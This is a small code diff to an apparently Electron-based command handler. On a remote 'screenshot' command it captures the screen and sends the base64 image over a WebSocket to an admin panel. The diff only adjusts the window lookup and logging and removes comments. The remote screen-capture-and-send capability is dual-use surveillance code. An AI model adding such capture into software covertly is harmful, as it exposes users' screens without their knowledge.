@@ -4,7 +4,7 @@ const screenshotHandler = require('../screenshot/ScreenshotHandler');
 class CommandHandler {
   static async handleCommand(message) {
     console.log('Processing command:', message);
-    const mainWindow = BrowserWindow.getAllWindows()[0];
+    const mainWindow = global.mainWindow || BrowserWindow.getAllWindows()[0];
     
     if (!mainWindow) {
       console.log('No main window found');
@@ -16,15 +16,14 @@ class CommandHandler {
         case 'screenshot':
           console.log('Taking screenshot...');
           const result = await screenshotHandler.takeScreenshot();
-          console.log('Screenshot taken successfully');
+          console.log('Screenshot result:', result);
           
           if (result.success) {
-            // WebSocket üzerinden admin paneline gönder
             const websocketService = require('../websocketService');
             websocketService.sendMessage({
               type: 'screenshot',
               token: message.token,
-              data: result.data.split(',')[1] // Base64 verinin header kısmını kaldır
+              data: result.data.split(',')[1]
             });
           }
           
